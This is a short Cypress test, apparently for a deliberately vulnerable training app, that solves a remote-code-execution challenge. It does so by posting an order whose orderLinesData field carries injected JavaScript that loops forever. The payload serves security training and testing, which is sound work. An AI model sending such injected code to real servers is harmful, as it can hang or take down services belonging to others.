export function rceChallenge() {

  cy.signin('cypress@mail.com','cypress');
      
  // Visit API documentation
  cy.visit('/api-docs');
      
  cy.get('@token').then((token) => {
        
    const options = {
      method: 'POST',
      url: '/b2b/v2/orders',
      body: {
        "orderLinesData": "(function dos() { while(true); })()"
      },
      auth: { 
        bearer: token
      },
      failOnStatusCode: false
    }

    cy.request(options).then(() => {
      cy.isSolvedChallenge('rceChallenge').should('eq', true);
    });
        
  });
  
}
